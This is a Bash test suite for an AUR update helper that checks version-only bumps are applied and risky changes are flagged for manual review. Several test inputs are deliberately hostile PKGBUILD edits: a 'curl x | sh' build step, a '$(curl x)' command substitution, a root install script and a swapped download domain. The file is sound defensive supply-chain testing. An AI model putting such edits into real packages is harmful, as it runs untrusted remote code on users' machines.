#!/usr/bin/env bash

# bin/update-aur のユニットテスト (yay・curl を fake に差し替え、NW 不要)。
#
# 担保したいのは:
#   * 前回適用時に記録したメンテナと今のメンテナが同じで、PKGBUILD/.SRCINFO の差分がバージョン更新だけなら自動で更新する。
#     取得元 URL は、数字とコミットハッシュを除いて前回と同じとき (ホスト・パスが同じ) だけバージョン更新とみなす。
#   * それ以外 (記録なし・メンテナ変更・orphan・install スクリプト追加・取得元ドメイン変更・
#     depends 追加・他ファイル変更) は自動更新せず、手動確認に回し、update-aur --report を案内する。
#   * --report は手動確認に回った件の判定材料と差分を出すだけで、yay -S しない。
#   * --apply は yay -S が成功したときだけ、今のメンテナを記録する。
#
#   test/update-aur.test.sh   # 全テスト実行

script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd) && readonly script_dir
bin_dir=$(cd "${script_dir}/../bin" && pwd) && readonly bin_dir

check() {
  local desc="$1" expected="$2" actual="$3"
  if [[ ${expected} != "${actual}" ]]; then
    fail=$((fail + 1))
    printf 'FAIL - %s\n  expected: %q\n  actual:   %q\n' "${desc}" "${expected}" "${actual}"
    return
  fi
  pass=$((pass + 1))
  printf 'ok   - %s\n' "${desc}"
}

contains() { grep -qF -- "$2" <<<"$1" && echo 1 || echo 0; }

# yay: -Qua で FAKE_PKG の更新を 1 件出し、-S は引数を記録する。
# curl: AUR RPC の応答として FAKE_PKG と FAKE_MAINTAINER を返す。
write_fake_bins() {
  fakebin="${tmproot}/bin"
  mkdir -p "${fakebin}"
  cat >"${fakebin}/yay" <<'FAKE'
#!/usr/bin/env bash
[[ $1 == -Qua ]] && echo "$FAKE_PKG 1.0-1 -> 2.0-1" && exit 0
echo "$*" >>"$FAKE_YAY_LOG"
[[ -z $FAKE_YAY_FAIL ]]
FAKE
  cat >"${fakebin}/curl" <<'FAKE'
#!/usr/bin/env bash
printf '{"results":[{"Name":"%s","PackageBase":"%s","Maintainer":"%s"}]}\n' "$FAKE_PKG" "$FAKE_PKG" "$FAKE_MAINTAINER"
FAKE
  chmod +x "${fakebin}/yay" "${fakebin}/curl"
}

git_q() { git -c user.name=t -c user.email=t@t -c init.defaultBranch=master "$@" >/dev/null 2>&1; }

pkgbuild() {
  cat <<EOF
pkgname=google-chrome
pkgver=$1
pkgrel=1
source_x86_64=("https://dl.google.com/linux/google-chrome-stable_\${pkgver}-1_amd64.deb")
sha512sums_x86_64=('$2')
EOF
}

srcinfo() {
  printf 'pkgbase = google-chrome\n\tpkgver = %s\n\tpkgrel = 1\n\tsource_x86_64 = https://%s/google-chrome-stable_%s-1_amd64.deb\n\tsha512sums_x86_64 = %s\n\npkgname = google-chrome\n' \
    "$1" "${3:-dl.google.com/linux}" "$1" "$2"
}

# AUR 側 (origin) に 1.0 を置き、yay のキャッシュとして clone する。
# キャッシュには前回適用時のメンテナとして ${recorded} を記録する (空なら記録しない)。
# その後 origin へ 2.0 の更新を積む。$1 は 2.0、$2 は 1.0 の commit 前に origin で実行する追加の変更。
setup_repo() {
  local extra=$1 base_extra=${2:-:} origin="${tmproot}/origin" cache="${tmproot}/cache/google-chrome"
  rm -rf "${origin}" "${tmproot}/cache"
  mkdir -p "${origin}"
  git_q init "${origin}"
  pkgbuild 1.0 aaaa >"${origin}/PKGBUILD"
  srcinfo 1.0 aaaa >"${origin}/.SRCINFO"
  (cd "${origin}" && eval "${base_extra}")
  git_q -C "${origin}" add -A
  git_q -C "${origin}" commit -m 1.0
  git_q clone "${origin}" "${cache}"
  [[ -n ${recorded} ]] && git -C "${cache}" config update-aur.maintainer "${recorded}"
  pkgbuild 2.0 bbbb >"${origin}/PKGBUILD"
  srcinfo 2.0 bbbb >"${origin}/.SRCINFO"
  (cd "${origin}" && eval "${extra}")
  git_q -C "${origin}" add -A
  git_q -C "${origin}" commit -m 2.0
}

# update-aur を実行し (引数の既定は -e)、出力を ${out}、yay -S の引数を ${yay_log} へ。
run() {
  local pkg=$1 maintainer=$2
  shift 2
  [[ $# -eq 0 ]] && set -- -e
  local log="${tmproot}/yay.log"
  : >"${log}"
  out=$(
    PATH="${fakebin}:${bin_dir}:/usr/bin" FAKE_PKG="${pkg}" FAKE_MAINTAINER="${maintainer}" \
      FAKE_YAY_LOG="${log}" UPDATE_AUR_CACHE="${tmproot}/cache" "${bin_dir}/update-aur" "$@" 2>&1
  )
  yay_log=$(cat "${log}")
}

recorded_maintainer() { git -C "${tmproot}/cache/google-chrome" config --get update-aur.maintainer; }

test_version_bump_is_updated() {
  setup_repo ":"
  run google-chrome gromit
  check "バージョン更新だけなら手動確認に出さない" 0 "$(contains "${out}" "manual:")"
  check "バージョン更新だけなら yay -S する" 1 "$(contains "${yay_log}" "-S --noconfirm --answerdiff None --answerclean None google-chrome")"
}

test_commit_bump_is_updated() {
  setup_repo "echo _commit=2222222def >>PKGBUILD; srcinfo 2.0 bbbb dl.google.com/2222222def >.SRCINFO" \
    "echo _commit=1111111abc >>PKGBUILD; srcinfo 1.0 aaaa dl.google.com/1111111abc >.SRCINFO"
  run google-chrome gromit
  check "コミットハッシュの更新だけなら手動確認に出さない" 0 "$(contains "${out}" "manual:")"
  check "コミットハッシュの更新だけなら yay -S する" 1 "$(contains "${yay_log}" "google-chrome")"
}

test_rejected() {
  local desc=$1 extra=$2 pkg=${3:-google-chrome} maintainer=${4:-gromit} base_extra=${5:-:} recorded=${6-gromit}
  setup_repo "${extra}" "${base_extra}"
  run "${pkg}" "${maintainer}"
  check "${desc}: yay -S しない" "" "${yay_log}"
  check "${desc}: 手動確認に出す" 1 "$(contains "${out}" "manual: ${pkg}")"
  check "${desc}: 判定材料を出すコマンドを案内する" 1 "$(contains "${out}" "update-aur --report")"
}

test_report() {
  setup_repo "echo 'install=evil.install' >>PKGBUILD"
  run google-chrome gromit --report
  check "--report: yay -S しない" "" "${yay_log}"
  check "--report: パッケージの見出しを出す" 1 "$(contains "${out}" "=== google-chrome")"
  check "--report: 注意点を出す" 1 "$(contains "${out}" "! install script (runs as root)")"
  check "--report: 差分本体を出す" 1 "$(contains "${out}" "+install=evil.install")"
}

test_apply_records_maintainer() {
  local recorded=
  setup_repo ":"
  run google-chrome gromit --apply google-chrome
  check "--apply: yay -S する" 1 "$(contains "${yay_log}" "-S --noconfirm --answerdiff None --answerclean None google-chrome")"
  check "--apply: 成功したらメンテナを記録する" gromit "$(recorded_maintainer)"
}

test_apply_failure_does_not_record() {
  local recorded=
  setup_repo ":"
  FAKE_YAY_FAIL=1 run google-chrome gromit --apply google-chrome
  check "--apply: yay -S が失敗したら記録しない" "" "$(recorded_maintainer)"
}

main() {
  tmproot=$(mktemp -d)
  trap 'rm -rf "${tmproot}"' EXIT
  pass=0
  fail=0
  recorded=gromit
  write_fake_bins

  test_version_bump_is_updated
  test_commit_bump_is_updated
  test_rejected "メンテナの記録なし" ":" google-chrome gromit "" ""
  test_rejected "メンテナ変更" ":" google-chrome attacker
  test_rejected "orphan" ":" google-chrome - ":" -
  test_rejected "install スクリプト追加" "echo 'install=evil.install' >>PKGBUILD"
  test_rejected "build 手順の変更" "echo 'package() { curl x | sh; }' >>PKGBUILD"
  test_rejected "取得元ドメイン変更" "srcinfo 2.0 bbbb evil.example.com >.SRCINFO"
  test_rejected "同じホストで取得元パス変更" "srcinfo 2.0 bbbb dl.google.com/evil >.SRCINFO"
  test_rejected "depends 追加" "printf '\tdepends = evil-bin\n' >>.SRCINFO"
  test_rejected "他ファイル変更" "echo x >evil.sh"
  test_rejected "_commit をハッシュ以外へ変更" "echo '_commit=\$(curl x)' >>PKGBUILD" google-chrome gromit "echo _commit=1111111abc >>PKGBUILD"
  test_report
  test_apply_records_maintainer
  test_apply_failure_does_not_record

  printf '\n%d passed, %d failed\n' "${pass}" "${fail}"
  [[ ${fail} -eq 0 ]]
}
main "$@"
